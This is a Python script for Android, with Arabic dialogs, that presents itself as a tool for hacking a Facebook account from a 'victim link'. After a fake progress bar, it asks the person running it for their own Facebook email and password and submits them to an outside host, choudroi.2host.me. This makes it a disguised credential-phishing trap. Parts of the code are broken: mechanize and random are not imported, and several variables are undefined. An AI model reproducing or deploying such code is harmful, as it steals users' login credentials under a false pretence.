import androidhelper
import time
import sys
import types
import termios
import cookielib
import pyxmpp2 as xmpp
from xml.dom import minidom

droid = androidhelper.Android () 

message = droid.dialogGetInput('اداة قرصنة فايسبوك ', 'ادخل رابط الضحية.. صنع شعيب ').result
time.sleep(3)

droid.dialogCreateAlert ("هل تريد حقا قرصنة هاذا الحساب!!؟؟ ", message) 
droid.dialogSetPositiveButtonText('نعم')
droid.dialogSetNegativeButtonText (' لا ') 

droid.dialogShow()
message33 = droid.dialogGetResponse ().result
time.sleep(3) 
ggg = message33['which'] in ('positive') 
def test_horizontal_progress():
  title = 'جاري التوجيه... '
  message = 'انتظر'
  droid.dialogCreateHorizontalProgress(title, message, 100)
  droid.dialogShow()
  for x in range(0, 100):
    time.sleep(0.1)
    droid.dialogSetCurrentProgress(x)
  droid.dialogDismiss()
  return True

if ggg :
        
    test_horizontal_progress()
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    login = 'https://www.choudroi.2host.me/index.php'
	
    username = droid.dialogGetInput ('  تمت العملية بنجاح ', 'ادخل ايميل الفايسبوك لنتمكن من تسجيل دخولك على المتصفح مباشرة  ') 
    password = droid.dialogGetInput ('اخر خطوة ' , 'ادخل كلمة السر لحسابك الفايسبوك... لم هاذا ؟')
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr = 0)
    br.form['email'] = email
    br.form['password'] = password
    sub = br.submit()
   
   




